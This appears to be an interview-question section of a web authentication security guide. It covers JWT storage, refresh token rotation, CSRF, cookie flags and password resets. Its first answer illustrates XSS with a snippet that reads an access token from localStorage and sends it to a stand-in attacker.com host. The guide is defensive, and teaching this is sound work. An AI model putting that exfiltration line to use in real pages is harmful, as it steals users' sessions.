### Q1: Why shouldn't you store JWTs in localStorage?

**Answer:** localStorage is vulnerable to XSS (Cross-Site Scripting) attacks. Any JavaScript code on the page can access localStorage, including malicious scripts injected through XSS vulnerabilities.

**Attack scenario:**
```javascript
// Attacker injects this script via XSS
const token = localStorage.getItem('accessToken');
fetch('http://attacker.com/steal?token=' + token);
// Token stolen, attacker can impersonate user
```

**Better approach:**
- Access tokens: Store in memory (React state, Angular service)
- Refresh tokens: Store in httpOnly cookies (JavaScript can't access)

**Trade-off:** Tokens in memory are lost on page reload, but that's acceptable. Use refresh token to get new access token.

### Q2: Explain the purpose of refresh token rotation.

**Answer:** Refresh token rotation issues a new refresh token every time the old one is used, preventing token reuse and detecting theft.

**How it works:**
1. User exchanges refresh token for access token
2. Server issues NEW refresh token, marks old one as used
3. If attacker tries to use old token again, server detects reuse
4. Server revokes entire token family, forcing re-authentication

**Benefits:**
- Limits damage from stolen refresh tokens
- Detects token theft (reuse indicates compromise)
- Provides security without sacrificing UX

**Implementation key:** Track token families and mark tokens as "used" immediately after exchange.

### Q3: What are the security implications of long-lived access tokens?

**Answer:** Long-lived access tokens increase risk if compromised:

**Problems:**
- **Extended exposure window**: If stolen, attacker has longer access period
- **Delayed revocation**: Can't revoke JWTs before expiry (stateless nature)
- **Increased attack surface**: More time for attacker to exploit

**Example:**
- 30-day access token stolen → Attacker has 30 days of access
- 15-minute access token stolen → Attacker has 15 minutes

**Best practice:**
- Access tokens: 15 minutes - 1 hour
- Refresh tokens: 7-30 days (with rotation)
- Balance: Security vs UX (frequent re-authentication annoys users)

### Q4: How do you protect authentication against CSRF attacks?

**Answer:** CSRF protection for authentication:

**Primary defense: SameSite cookies**
```typescript
res.cookie('refreshToken', token, {
  sameSite: 'strict'  // or 'lax'
});
```
Prevents cross-site requests from including cookie.

**Additional layers:**
1. **CSRF tokens**: For state-changing operations
2. **Custom headers**: Triggers CORS preflight
3. **Origin/Referer validation**: Server-side checks
4. **Re-authentication**: For sensitive operations

**Important:** Don't rely on CORS alone for CSRF protection. CORS prevents reading responses but doesn't prevent requests.

**Note on JWT in headers:** Authorization header (Bearer token) naturally resistant to CSRF because attacker can't forge custom headers in simple cross-site requests.

### Q5: What's the difference between httpOnly and secure cookie flags?

**Answer:**

**httpOnly:**
- Prevents JavaScript access to cookie
- Protects against XSS attacks
- Cookie still sent with requests
- Example: `document.cookie` can't read it

**secure:**
- Cookie only sent over HTTPS
- Protects against MITM attacks
- Prevents cookie theft on insecure connections
- Useless over HTTP

**Best practice: Use both together**
```typescript
res.cookie('refreshToken', token, {
  httpOnly: true,  // XSS protection
  secure: true,    // MITM protection
  sameSite: 'strict'  // CSRF protection
});
```

**When to omit:**
- Development (HTTP): `secure: process.env.NODE_ENV === 'production'`
- Never omit httpOnly (even in development)

### Q6: How do you handle token expiration in a SPA?

**Answer:** Strategies for handling token expiration:

**1. Silent refresh before expiry:**
```typescript
// Refresh 1 minute before access token expires
useEffect(() => {
  const interval = setInterval(() => {
    if (tokenExpiresIn < 60) {
      refreshAccessToken();
    }
  }, 30000); // Check every 30 seconds
  
  return () => clearInterval(interval);
}, [tokenExpiresIn]);
```

**2. Refresh on 401 response:**
```typescript
// Interceptor catches 401, refreshes, retries
if (response.status === 401) {
  const newToken = await refreshAccessToken();
  // Retry original request with new token
}
```

**3. Background refresh on activity:**
```typescript
// Refresh token when user interacts with app
document.addEventListener('click', () => {
  if (shouldRefresh()) {
    refreshAccessToken();
  }
});
```

**Best approach:** Combination of #1 and #2
- Proactive refresh prevents failed requests
- Reactive refresh handles edge cases

**Handle refresh failure:**
```typescript
try {
  await refreshAccessToken();
} catch (error) {
  // Refresh token expired or invalid
  redirectToLogin();
}
```

### Q7: What are the security considerations for password reset flows?

**Answer:** Secure password reset implementation:

**1. Generate secure reset tokens:**
```typescript
const resetToken = crypto.randomBytes(32).toString('hex');
const hashedToken = crypto
  .createHash('sha256')
  .update(resetToken)
  .digest('hex');

// Store hashed version in database
await db.users.update({
  resetToken: hashedToken,
  resetTokenExpiry: Date.now() + 3600000 // 1 hour
});

// Send unhashed version to user via email
sendEmail(user.email, resetToken);
```

**2. Token should:**
- Be cryptographically random
- Expire quickly (1 hour max)
- Be single-use
- Be stored hashed in database

**3. Verification process:**
```typescript
// Verify token
const hashedToken = crypto
  .createHash('sha256')
  .update(providedToken)
  .digest('hex');

const user = await db.users.findOne({
  resetToken: hashedToken,
  resetTokenExpiry: { $gt: Date.now() }
});

if (!user) {
  throw new Error('Invalid or expired token');
}

// Reset password
await user.setPassword(newPassword);
await user.update({
  resetToken: null,
  resetTokenExpiry: null
});
```

**4. Additional security:**
- Rate limit reset requests
- Don't reveal if email exists
- Invalidate all sessions after reset
- Log password reset events

**5. Email security:**
- Send reset link, not temporary password
- Use HTTPS URLs only
- Include warning about phishing

### Q8: How do you implement "Remember Me" functionality securely?

**Answer:** Secure "Remember Me" implementation:

**Approach 1: Extended refresh token**
```typescript
// Login with remember me
const refreshTokenExpiry = rememberMe ? '30d' : '7d';

const refreshToken = jwt.sign(
  { sub: userId },
  secret,
  { expiresIn: refreshTokenExpiry }
);

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: rememberMe ? 30 * 24 * 60 * 60 * 1000 : 7 * 24 * 60 * 60 * 1000
});
```

**Approach 2: Persistent session tokens**
```typescript
// Generate persistent token (separate from refresh token)
const persistentToken = crypto.randomBytes(32).toString('hex');

await db.persistentSessions.create({
  userId,
  token: await hash(persistentToken),
  expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
  createdAt: new Date()
});

res.cookie('persistentSession', persistentToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000
});
```

**Security considerations:**
1. **Always use httpOnly + secure + SameSite**
2. **Store hashed tokens in database**
3. **Implement token rotation** (even for persistent tokens)
4. **Allow users to view/revoke active sessions**
5. **Re-authenticate for sensitive operations** (even with valid token)
6. **Limit number of active persistent sessions per user**

**Best practice:** Inform users of security implications and let them choose.

## Key Takeaways

1. **Never store tokens in localStorage** - Vulnerable to XSS; use memory for access tokens and httpOnly cookies for refresh tokens
2. **Short-lived access tokens** - 15 minutes to 1 hour limit exposure if stolen; refresh tokens can be longer-lived
3. **Refresh token rotation** - Issue new refresh token on each use; detect and prevent token reuse attacks
4. **httpOnly cookies for refresh tokens** - JavaScript can't access, protecting against XSS; requires CSRF protection
5. **Strong JWT secrets** - Use cryptographically random secrets (64+ characters); never hardcode or use weak defaults
6. **Validate all token claims** - Check issuer, audience, algorithm, expiration; don't just verify signature
7. **Implement token revocation** - Blacklist mechanism for logout and security incidents; essential for sensitive operations
8. **Rate limit authentication endpoints** - Prevent brute force attacks; 5-10 attempts per 15 minutes for login
9. **Audit logging** - Track login/logout events, failed attempts, token reuse; enable security monitoring and forensics
10. **Defense in depth** - Combine multiple protections (HTTPS, httpOnly, SameSite, CSRF tokens, rate limiting, monitoring)

## Resources

### Official Documentation
- [JWT.io](https://jwt.io/) - JWT introduction and debugger
- [RFC 7519: JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

### Libraries
- [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) - JWT implementation for Node.js
- [passport](http://www.passportjs.org/) - Authentication middleware for Node.js
- [express-rate-limit](https://www.npmjs.com/package/express-rate-limit) - Rate limiting middleware

### Articles and Guides
- [OWASP: JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Stop using JWT for sessions](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/)
- [The Ultimate Guide to handling JWTs on frontend clients](https://hasura.io/blog/best-practices-of-using-jwt-with-graphql/)

### Security Resources
- [Auth0 Security Documentation](https://auth0.com/docs/security)
- [OAuth 2.0 Security Best Practices](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
